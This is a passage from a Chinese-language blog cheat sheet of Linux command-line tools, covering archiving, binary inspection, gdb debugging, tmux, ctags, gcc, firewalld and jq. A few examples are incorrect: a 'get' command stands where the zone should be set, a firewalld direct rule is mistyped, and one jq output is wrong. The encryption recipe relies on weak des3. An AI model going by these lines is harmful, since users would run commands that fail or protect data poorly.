<h4 id="5-1-2-示例"><a href="#5-1-2-示例" class="headerlink" title="5.1.2. 示例"></a>5.1.2. 示例</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -xzf xxx.tar.gz             # 解压tar.gz文件</span><br><span class="line">tar -xzvf xxx.tar.gz -C tmp     # 解压tar.gz文件显示过程，解压到tmp目录</span><br><span class="line">tar -czvf xxx.tar.gz -C tmp ./  # 将tmp目录下的所有文件压缩，以tmp为根目录</span><br></pre></td></tr></table></figure>

<h4 id="5-1-3-加密压缩"><a href="#5-1-3-加密压缩" class="headerlink" title="5.1.3. 加密压缩"></a>5.1.3. 加密压缩</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用openssl命令进行加密压缩</span></span><br><span class="line">tar -zvcf - -C xxx ./ | openssl des3 -salt -k &quot;xxx&quot; | dd of=xxx.des3</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压</span></span><br><span class="line">dd if=xxx.des3 | openssl des3 -d -k &#x27;xxx&#x27; | tar -zxf - -C xxx/</span><br></pre></td></tr></table></figure>

<ul>
<li><font color = "red"><strong>openssl在1.1.0版本有修改导致不兼容，可以用下面的方法</strong></font><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">在OpenSSL 1.1.0中，我们从MD5更改为SHA-256。我们这样做是作为整体改变的一部分，以摆脱现在不安全和破碎的MD5算法。如果您有旧文件，请使用“-md md5”标志对其进行解密</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="5-2-zip命令"><a href="#5-2-zip命令" class="headerlink" title="5.2. zip命令"></a>5.2. zip命令</h3><h4 id="5-2-1-压缩"><a href="#5-2-1-压缩" class="headerlink" title="5.2.1. 压缩"></a>5.2.1. 压缩</h4><p>压缩只会追加不会删除已经存在于zip文件中的文件</p>
<ul>
<li><code>-j</code>: 去除路径</li>
<li><code>-r</code>: 递归压缩所有文件</li>
<li><code>-m</code>: 打包后删除压缩的源文件</li>
<li><code>-x &lt;pattern&gt;</code>: 忽略某些文件，可以连续写多个</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zip -r (filename.zip) (path)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">去除路径</span></span><br><span class="line">zip -jr (filename.zip) (path)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">排除zip和<span class="built_in">cap</span>压缩，-x可以连续写多个</span></span><br><span class="line">zip -r xxx.zip ./ -x &#x27;*.pcap*&#x27; -x &#x27;*.zip&#x27; -x &#x27;*.rar&#x27; -x &#x27;*.cap&#x27; -x &#x27;*.7z&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="5-2-2-解压"><a href="#5-2-2-解压" class="headerlink" title="5.2.2. 解压"></a>5.2.2. 解压</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">unzip xxx.zip -d xxx</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压特定文件</span></span><br><span class="line">unzip xxx.zip &quot;b/c&quot; -d xxx</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看文件列表</span></span><br><span class="line">unzip -l xxx.zip</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定编码</span></span><br><span class="line">unzip -O gbk (filename.zip) -d (path)</span><br></pre></td></tr></table></figure>

<ul>
<li>不加<code>-d</code>就解压到当前目录</li>
</ul>
<h2 id="6-e2label-修改卷标名称"><a href="#6-e2label-修改卷标名称" class="headerlink" title="6. e2label 修改卷标名称"></a>6. e2label 修改卷标名称</h2><p>分区为<code>ext2/ext3</code>类型使用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">e2label /dev/(partition) &quot;(name)&quot;</span><br></pre></td></tr></table></figure>

<h2 id="7-readelf-查看二进制符号表"><a href="#7-readelf-查看二进制符号表" class="headerlink" title="7. readelf 查看二进制符号表"></a>7. readelf 查看二进制符号表</h2><h3 id="7-1-查看符号表"><a href="#7-1-查看符号表" class="headerlink" title="7.1. 查看符号表"></a>7.1. 查看符号表</h3><ul>
<li>查看有哪些二进制符号和对应的函数地址</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-s 符号表</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-W 符号名字显示全</span></span><br><span class="line">readelf -Ws xxxx</span><br></pre></td></tr></table></figure>

<h3 id="7-2-查看二进制依赖"><a href="#7-2-查看二进制依赖" class="headerlink" title="7.2. 查看二进制依赖"></a>7.2. 查看二进制依赖</h3><ul>
<li>会显示依赖的动态库路径</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">readelf -d xxx</span><br></pre></td></tr></table></figure>

<h2 id="8-objdump-导出汇编指令表"><a href="#8-objdump-导出汇编指令表" class="headerlink" title="8. objdump 导出汇编指令表"></a>8. objdump 导出汇编指令表</h2><p>导出二进制的汇编指令表，如果没有strip掉符号，还能看到每个函数的汇编指令和对应地址</p>
<ul>
<li><code>-D</code>: 展示所有段的汇编</li>
<li><code>-S</code>: 将代码内嵌到汇编中（前提是有符号）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -DS xxxx &gt; xxx.dump</span><br></pre></td></tr></table></figure>

<h2 id="9-strace-查看系统调用"><a href="#9-strace-查看系统调用" class="headerlink" title="9. strace 查看系统调用"></a>9. strace 查看系统调用</h2><ul>
<li><code>-t</code>: 打印时间</li>
<li><code>-tt</code>: 打印时间，精确到微秒</li>
<li><code>-T</code>: 打印系统调用占用时间</li>
<li><code>-f</code>: 打印进程号，可针对多进程程序</li>
<li><code>-v</code>: 参数打全，不省略</li>
<li><code>-o file</code>: 结果输出到文件</li>
<li><code>-p [PID]</code>: 挂载到一个进程</li>
</ul>
<h3 id="9-1-查看单进程的系统调用，不重启进程"><a href="#9-1-查看单进程的系统调用，不重启进程" class="headerlink" title="9.1. 查看单进程的系统调用，不重启进程"></a>9.1. 查看单进程的系统调用，不重启进程</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">strace -p xxx</span><br></pre></td></tr></table></figure>

<h2 id="10-tree-查看文件树"><a href="#10-tree-查看文件树" class="headerlink" title="10. tree 查看文件树"></a>10. tree 查看文件树</h2><ul>
<li><code>-L n</code>: 目录深度</li>
</ul>
<h2 id="11-sshfs-挂载远程目录"><a href="#11-sshfs-挂载远程目录" class="headerlink" title="11. sshfs 挂载远程目录"></a>11. sshfs 挂载远程目录</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">和mount一样，将远程的/aaa挂载到本地~/xxx</span></span><br><span class="line">sshfs xxx@xxx.xxx.xxx.xxx:/aaa ~/xxx</span><br></pre></td></tr></table></figure>

<h2 id="12-cmake-跨平台编译命令"><a href="#12-cmake-跨平台编译命令" class="headerlink" title="12. cmake 跨平台编译命令"></a>12. cmake 跨平台编译命令</h2><p>CMakeLists.txt编写参见<a href="/blogs/2019-06-03-makefile/#CMakeLists">CMakeLists.txt</a></p>
<h3 id="12-1-基本使用命令"><a href="#12-1-基本使用命令" class="headerlink" title="12.1 基本使用命令"></a>12.1 基本使用命令</h3><ul>
<li><code>-DCMAKE_BUILD_TYPE</code><ul>
<li><code>STRING=Debug</code>: 在linux上会编译出<code>libxxxd.so</code></li>
<li><code>STRING=Release</code></li>
<li><code>STRING=MinSizeRel</code></li>
<li><code>STRING=RelWithDebInfo</code>: 在linux上会编译出<code>libxxxrd.so</code></li>
</ul>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定build目录生成工程</span></span><br><span class="line">cmake -DCMAKE_BUILD_TYPE:STRING=Debug -B build/</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">vscode常用的编译命令</span></span><br><span class="line">cmake --no-warn-unused-cli -DCMAKE_EXPORT_COMPILE_COMMANDS:BOOL=TRUE -DCMAKE_BUILD_TYPE:STRING=Debug -H . -B build/ -G &quot;Visual Studio 14 2015&quot; -A win32</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译指定目标文件，会自动编译依赖，4线程编译</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不指定target编译所有</span></span><br><span class="line">cmake --build build/ --target xxx -j 4</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清理工程，相当于make clean</span></span><br><span class="line">cmake --build build/ --target clean -j 4</span><br></pre></td></tr></table></figure>

<h2 id="13-gdb-c-c-单步调试工具"><a href="#13-gdb-c-c-单步调试工具" class="headerlink" title="13. gdb c&#x2F;c++单步调试工具"></a>13. gdb c&#x2F;c++单步调试工具</h2><h3 id="13-1-基本使用命令"><a href="#13-1-基本使用命令" class="headerlink" title="13.1 基本使用命令"></a>13.1 基本使用命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">start                       # 开始调试,停在第一行代码处,(gdb)start</span><br><span class="line">l                           #list的缩写查看源代码,(gdb) l [number/function]</span><br><span class="line">b &lt;lines&gt;                   # b: Breakpoint的简写，设置断点。(gdb) b 10</span><br><span class="line">b &lt;func&gt;                    # b: Breakpoint的简写，设置断点。(gdb) b main</span><br><span class="line">b filename:[line/function]  # b:在文件filename的某行或某个函数处设置断点</span><br><span class="line">i breakpoints               # :info 的简写。(gdb)i breakpoints</span><br><span class="line">d [bpNO]                    # d: Delete breakpoint的简写，删除指定编号的某个断点，或删除所有断点。断点编号从1开始递增。 (gdb)d 1</span><br><span class="line">s                           # s: step执行一行源程序代码，如果此行代码中有函数调用，则进入该函数；(gdb) s</span><br><span class="line">n                           # n: next执行一行源程序代码，此行代码中的函数调用也一并执行。(gdb) n</span><br><span class="line">r                           # Run的简写，运行被调试的程序。如果此前没有下过断点，则执行完整个程序；如果有断点，则程序暂停在第一个可用断点处。(gdb) r</span><br><span class="line">c                           # Continue的简写，继续执行被调试程序，直至下一个断点或程序结束。(gdb) c</span><br><span class="line">finish                      # 函数结束</span><br><span class="line">p [var]                     # Print的简写，显示指定变量（临时变量或全局变量 例如 int a）的值。(gdb) p a</span><br><span class="line">display [var]               # display，设置想要跟踪的变量(例如 int a)。(gdb) display a</span><br><span class="line">undisplay [varnum]          # undisplay取消对变量的跟踪，被跟踪变量用整型数标识。(gdb) undisplay 1</span><br><span class="line">set args                    # 可指定运行时参数。(gdb)set args 10 20</span><br><span class="line">show args                   # 查看运行时参数。</span><br><span class="line">q                           # Quit的简写，退出GDB调试环境。(gdb) q</span><br><span class="line">help [cmd]                  # GDB帮助命令，提供对GDB名种命令的解释说明。如果指定了“命令名称”参数，则显示该命令的详细说明；如果没有指定参数，则分类显示所有GDB命令，供用户进一步浏览和查询。(gdb)help</span><br><span class="line">回车                        # 重复前面的命令，(gdb)回车</span><br></pre></td></tr></table></figure>

<h3 id="13-2-可以看代码版本-cgdb"><a href="#13-2-可以看代码版本-cgdb" class="headerlink" title="13.2. 可以看代码版本 cgdb"></a>13.2. 可以看代码版本 cgdb</h3><h4 id="1-快捷键"><a href="#1-快捷键" class="headerlink" title="1) 快捷键"></a>1) 快捷键</h4><p><strong>gdb窗口</strong></p>
<ul>
<li><code>Esc</code>: 转到代码窗口</li>
</ul>
<p><strong>代码窗口</strong></p>
<ul>
<li><code>i</code>: 转到gdb窗口</li>
<li><code>o</code>: 打开源码文件列表，<code>/</code>搜索</li>
<li><code>j</code>: 光标下移</li>
<li><code>k</code>: 光标上移</li>
<li><code>Space</code>: 当前行打断点</li>
<li><code>=</code>: 放大代码窗口一行</li>
<li><code>-</code>: 减小代码窗口一行</li>
<li><code>Shift + +</code>: 放大窗口一大段</li>
<li><code>Shift + _</code>: 缩小窗口一大段</li>
</ul>
<h3 id="13-3-函数堆栈"><a href="#13-3-函数堆栈" class="headerlink" title="13.3. 函数堆栈"></a>13.3. 函数堆栈</h3><ul>
<li><code>bt</code>: 查看当前堆栈</li>
<li><code>frame &lt;n&gt;</code>: 跳转到当前哪一层堆栈</li>
<li><code>up &lt;n&gt;</code>: 向上跳几层</li>
<li><code>down &lt;n&gt;</code>: 向下跳几层</li>
</ul>
<h3 id="13-4-带参数的执行"><a href="#13-4-带参数的执行" class="headerlink" title="13.4. 带参数的执行"></a>13.4. 带参数的执行</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb --args /path/to/run a b</span><br></pre></td></tr></table></figure>

<h3 id="13-5-gdbserver远程调试"><a href="#13-5-gdbserver远程调试" class="headerlink" title="13.5. gdbserver远程调试"></a>13.5. gdbserver远程调试</h3><ul>
<li>在远程服务器执行</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdbserver 0.0.0.0:6666 --attach 14614</span><br></pre></td></tr></table></figure>

<ul>
<li>本地gdb连接即可</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="13-6-gdb忽略某个信号不打断"><a href="#13-6-gdb忽略某个信号不打断" class="headerlink" title="13.6. gdb忽略某个信号不打断"></a>13.6. gdb忽略某个信号不打断</h3><ul>
<li>经常遇到gdb调试进去后，因为某些信号打断，又可以继续，使用下面命令跳过</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">gdb&gt; </span><span class="language-bash">handle SIGINT nostop</span></span><br></pre></td></tr></table></figure>

<h2 id="14-tmux"><a href="#14-tmux" class="headerlink" title="14. tmux"></a>14. <span id = "tmux">tmux</span></h2><h3 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h3><ul>
<li>工具特定命令前缀为<code>Ctrl + b</code></li>
</ul>
<p><strong>session操作</strong></p>
<ul>
<li><code>tmux ls</code>: 查看session列表</li>
<li><code>prefix, d</code>: 离开当前session，但是session继续跑</li>
<li><code>tmux a -t &lt;session-name&gt;</code>: 重新回到一个session</li>
<li><code>tmux kill-session -t &lt;session-name&gt;</code>: 杀死一个session</li>
</ul>
<p><strong>窗口操作</strong></p>
<ul>
<li><code>prefix, c</code>: 创建新窗口</li>
<li><code>prefix, n</code>: 下一个窗口</li>
<li><code>prefix, p</code>: 上一个窗口</li>
<li><code>prefix, l</code>: 进入前一个操作的窗口</li>
<li><code>prefix, w</code>: 列出窗口进行选择</li>
<li><code>prefix, ,</code>: 重命名当前窗口</li>
<li><code>prefix, Shift + &amp;</code>: 删除当前窗口</li>
</ul>
<p><strong>窗格操作</strong></p>
<ul>
<li><code>prefix, &lt;方向键&gt;</code>: 切换到相应窗格</li>
<li><code>prefix, Shift + &quot;</code>: 纵向分屏</li>
<li><code>prefix, Shift + %</code>: 横向分屏</li>
<li><code>prefix, Shift + !</code>: 将当前窗格新起一个窗口存放</li>
<li><code>prefix, Ctrl + &lt;方向键&gt;</code>: 朝相应方向移动边界</li>
<li><code>prefix, x</code>: 关闭当前窗格</li>
<li><code>prefix, z</code>: 当前窗格放大（专注，切换窗格就恢复了）</li>
<li><code>prefix, ;</code>: 切换到上一个窗格</li>
<li><code>prefix, o</code>: 切换到下一个窗格</li>
<li><code>prefix, [</code>: 进入copy mode</li>
<li><code>prefix, Ctrl + o</code>: 顺时针切换各个窗格</li>
<li><code>prefix, m</code>: 标记窗格，配合下面命令交换窗格</li>
<li><code>prefix, :swapp</code>: 切换窗格</li>
</ul>
<p><strong>copy mode</strong></p>
<ul>
<li><code>Ctrl + s</code>: 向下查找，输入字符串回车后，使用n和N选择下一个或者上一个</li>
<li><code>Ctrl + r</code>: 向上查找</li>
</ul>
<h2 id="15-fzf"><a href="#15-fzf" class="headerlink" title="15. fzf"></a>15. fzf</h2><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><ol>
<li>安装完成后，将下面配置加到<code>.zshrc</code>或者<code>.bashrc</code>中</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">40%屏显示非全屏，展示反向（输入框在上面，文件在下面正序），文件在右侧展示前50行</span></span><br><span class="line">export FZF_DEFAULT_OPTS=&quot;--height 40% --layout=reverse --preview &#x27;head -n 50 &#123;&#125; 2&gt;/dev/null&#x27;&quot;</span><br></pre></td></tr></table></figure>


<h2 id="16-ctags"><a href="#16-ctags" class="headerlink" title="16. ctags"></a>16. <span id = "ctags">ctags</span></h2><h3 id="16-1-C-C"><a href="#16-1-C-C" class="headerlink" title="16.1. C&#x2F;C++"></a>16.1. C&#x2F;C++</h3><h4 id="基本选项"><a href="#基本选项" class="headerlink" title="基本选项"></a>基本选项</h4><ul>
<li><code>-I xxx</code>: 许多函数定义最后有一个<code>__THROW</code>类似的，ctags将解析出错，加上此选项会忽略xxx</li>
<li><code>--fields=+iaS</code>:</li>
<li><code>--extra=+q</code></li>
<li><code>--c-kinds=+p</code></li>
</ul>
<h4 id="添加系统头文件支持"><a href="#添加系统头文件支持" class="headerlink" title="添加系统头文件支持"></a>添加系统头文件支持</h4><ul>
<li>执行以下命令生成系统头文件的tags</li>
<li>添加<code>set tags+=~/.vim/systags</code>包含系统头文件tags</li>
</ul>
<p>系统头文件检索列表，里面尖括号字段根据系统适配</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/include</span><br><span class="line">/usr/include/linux</span><br><span class="line">/usr/include/net</span><br><span class="line">/usr/include/netinet</span><br><span class="line">/usr/include/arpa</span><br><span class="line">/usr/include/c++/&lt;version&gt;</span><br><span class="line">/usr/include/&lt;sys-version&gt;-linux-gnu/sys</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把上面列表文件都扫出来，加到files.list里面</span></span><br><span class="line">find xxx -maxdepth 1 -type f &gt;&gt; files.list</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ctags根据files.list生成tags文件</span></span><br><span class="line">ctags -I __wur -I __THROW -I __THROWNL -I __attribute_pure__ -I __nonnull -I __attribute__ --file-scope=yes --language-force=C++ --links=yes --c-kinds=+p --c++-kinds=+p --fields=+iaS --extra=+q -f ~/.vim/systags -L files.list</span><br></pre></td></tr></table></figure>

<h3 id="16-2-php支持"><a href="#16-2-php支持" class="headerlink" title="16.2. php支持"></a>16.2. php支持</h3><p>转载自 <a href="https://www.cnblogs.com/longdouhzt/archive/2013/04/15/3022908.html">https://www.cnblogs.com/longdouhzt/archive/2013/04/15/3022908.html</a></p>
<ol>
<li>添加以下命令到<code>~/.bashrc</code>或者<code>~/.zshrc</code>等当前使用的bash的起始配置文件中，可以使用phptags来生成php的tags文件</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">alias phptags=&#x27;ctags --langmap=php:.engine.inc.module.theme.php  --php-kinds=cdf  --languages=php&#x27;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>添加以下配置到<code>~/.ctags</code>中，添加一些匹配规则</li>
</ol>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">--regex-php=/^[ \t]*[(private|public|static)( \t)]*<span class="keyword">function</span>[ \t]+([A-Za-z0-<span class="number">9</span>_]+)[ \t]*\(/\<span class="number">1</span>/<span class="keyword">f</span>, <span class="keyword">function</span>, functions/</span><br><span class="line">--regex-php=/^[ \t]*[(private|public|static)]+[ \t]+\$([A-Za-z0-<span class="number">9</span>_]+)[ \t]*/\<span class="number">1</span>/<span class="keyword">p</span>, property, properties/</span><br><span class="line">--regex-php=/^[ \t]*(const)[ \t]+([A-Za-z0-<span class="number">9</span>_]+)[ \t]*/\<span class="number">2</span>/d, const, constants/</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>到工程目录下<code>phptags -R</code>即可生成相应tags</li>
</ol>
<h2 id="17-gcc"><a href="#17-gcc" class="headerlink" title="17. gcc"></a>17. gcc</h2><h3 id="17-1-选项解释"><a href="#17-1-选项解释" class="headerlink" title="17.1. 选项解释"></a>17.1. 选项解释</h3><ul>
<li><code>-s</code>: strip掉所有符号</li>
<li><code>-fsanitize=address</code>: 监听内存泄漏，需要同时加上<code>-lasan</code>并且保证已经安装libasan</li>
<li><code>-fno-omit-frame-pointer</code></li>
<li><code>-Werror</code>: 所有warning当作error处理</li>
</ul>
<h3 id="17-2-查看预定义宏"><a href="#17-2-查看预定义宏" class="headerlink" title="17.2. 查看预定义宏"></a>17.2. 查看预定义宏</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; gcc -dM -E - &lt; /dev/null</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define __SSP_STRONG__ 3</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define __DBL_MIN_EXP__ (-1021)</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define __UINT_LEAST16_MAX__ 0xffff</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="17-3-单函数优化级别设定"><a href="#17-3-单函数优化级别设定" class="headerlink" title="17.3. 单函数优化级别设定"></a>17.3. 单函数优化级别设定</h3><ul>
<li>全局优化级别设定后，可以在编译时指定单个函数的优化级别</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">ip_rcv_finish</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> sock *sk, <span class="keyword">struct</span> sk_buff *skb)</span> __<span class="title">attribute__</span><span class="params">((optimize(<span class="string">&quot;O0&quot;</span>)))</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ip_rcv_finish</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> sock *sk, <span class="keyword">struct</span> sk_buff *skb)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>或者指定一批，<code>pragma</code>后面的函数都会应用此优化</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> GCC optimize(<span class="string">&quot;O0&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">ip_rcv_finish</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> sock *sk, <span class="keyword">struct</span> sk_buff *skb)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="18-firewalld-防火墙"><a href="#18-firewalld-防火墙" class="headerlink" title="18. firewalld 防火墙"></a>18. firewalld 防火墙</h2><h3 id="18-1-选项解释"><a href="#18-1-选项解释" class="headerlink" title="18.1. 选项解释"></a>18.1. 选项解释</h3><ul>
<li><code>--permanent</code>: 永久生效，加了这个选项，需要执行reload才能生效；不加，会立即生效，但是reload后会消失</li>
</ul>
<h3 id="18-2-基本操作"><a href="#18-2-基本操作" class="headerlink" title="18.2. 基本操作"></a>18.2. 基本操作</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重载防火墙规则</span></span><br><span class="line">firewall-cmd --reload</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启防火墙服务</span></span><br><span class="line">firewall-cmd --complete-reload</span><br></pre></td></tr></table></figure>

<h3 id="18-3-区域操作"><a href="#18-3-区域操作" class="headerlink" title="18.3. 区域操作"></a>18.3. 区域操作</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 查看区域 ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前使用的区域，返回每个网卡对应的区域</span></span><br><span class="line">firewall-cmd --get-active-zones</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看所有支持的区域</span></span><br><span class="line">firewall-cmd --get-zones</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看网卡对应的区域</span></span><br><span class="line">firewall-cmd --get-zone-of-interface=eth0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看默认区域</span></span><br><span class="line">firewall-cmd --get-default-zone</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看区域所有配置，不加zone返回默认区域</span></span><br><span class="line">firewall-cmd --zone=public --list-all</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 编辑区域 ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将一个接口加到public区域内，永久生效加上--permanent然后reload</span></span><br><span class="line">firewall-cmd --zone=public --add-interface=eth0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置默认区域，永久生效加上--permanent然后reload</span></span><br><span class="line">firewall-cmd --get-default-zone</span><br></pre></td></tr></table></figure>

<h3 id="18-4-服务操作"><a href="#18-4-服务操作" class="headerlink" title="18.4. 服务操作"></a>18.4. 服务操作</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 查看服务 ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列举服务，不加zone列举默认区域</span></span><br><span class="line">firewall-cmd --zone=work --list-services</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看支持的服务</span></span><br><span class="line">firewall-cmd --get-services</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 新增服务 ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">允许smtp服务，永久生效加上--permanent然后reload</span></span><br><span class="line">firewall-cmd --zone=work --add-service=smtp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 删除服务 ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除smtp服务，永久生效加上--permanent然后reload</span></span><br><span class="line">firewall-cmd --zone=work --remove-service=smtp</span><br></pre></td></tr></table></figure>

<h3 id="18-5-端口操作"><a href="#18-5-端口操作" class="headerlink" title="18.5. 端口操作"></a>18.5. 端口操作</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 查看服务 ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列举服务，不加zone列举默认区域</span></span><br><span class="line">firewall-cmd --zone=work --list-ports</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 新增服务 ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">允许22端口，永久生效加上--permanent然后reload</span></span><br><span class="line">firewall-cmd --zone=work --add-port=22/tcp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 删除服务 ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除22端口，永久生效加上--permanent然后reload</span></span><br><span class="line">firewall-cmd --zone=work --remove-port=22/tcp</span><br></pre></td></tr></table></figure>

<h3 id="18-6-直接操作"><a href="#18-6-直接操作" class="headerlink" title="18.6. 直接操作"></a>18.6. 直接操作</h3><ul>
<li>这个操作和firewalld原生的不在一起，如果firewalld放开了，这里禁止了，无法访问</li>
<li>如果firewalld禁止了，这里放开了，同样无法访问</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">firewall-cmd --direct -add-rule ipv4 filter INPUT 0 -p tcp --dport 9000 -j accept</span><br></pre></td></tr></table></figure>

<h2 id="19-jq-linux的json解析工具"><a href="#19-jq-linux的json解析工具" class="headerlink" title="19. jq linux的json解析工具"></a>19. jq linux的json解析工具</h2><h3 id="1-几种基本用法"><a href="#1-几种基本用法" class="headerlink" title="1. 几种基本用法"></a>1. 几种基本用法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查key是否存在</span></span><br><span class="line">=&gt; echo &#x27;&#123;&quot;a&quot;:1&#125;&#x27; | jq &#x27;has(&quot;b&quot;)&#x27;</span><br><span class="line">false</span><br><span class="line">=&gt; echo &#x27;&#123;&quot;a&quot;:1&#125;&#x27; | jq &#x27;has(&quot;a&quot;)&#x27;</span><br><span class="line">true</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">取值</span></span><br><span class="line">=&gt; echo &#x27;&#123;&quot;a&quot;:1&#125;&#x27; | jq &#x27;.&#x27;</span><br><span class="line">1</span><br><span class="line">=&gt; echo &#x27;&#123;&quot;a&quot;:&quot;1&quot;&#125;&#x27; | jq &#x27;.a&#x27;</span><br><span class="line">&quot;1&quot;</span><br></pre></td></tr></table></figure>

<h2 id="20-iotop-磁盘占用统计工具"><a href="#20-iotop-磁盘占用统计工具" class="headerlink" title="20. iotop 磁盘占用统计工具"></a>20. iotop 磁盘占用统计工具</h2><h3 id="1-几种基本用法-1"><a href="#1-几种基本用法-1" class="headerlink" title="1. 几种基本用法"></a>1. 几种基本用法</h3><ul>
<li>需要使用root权限</li>
<li>类似与top，不需要跟参数</li>
</ul>
<p><strong>统计中快捷键</strong></p>
<ul>
<li><code>o</code>: 仅显示占用io的进程</li>
<li><code>a</code>: 显示累计数据</li>
<li><code>shift + P</code>: 只显示进程，不显示线程，默认显示所有线程</li>
<li>使用左右方向键来选择排序的列</li>
</ul>
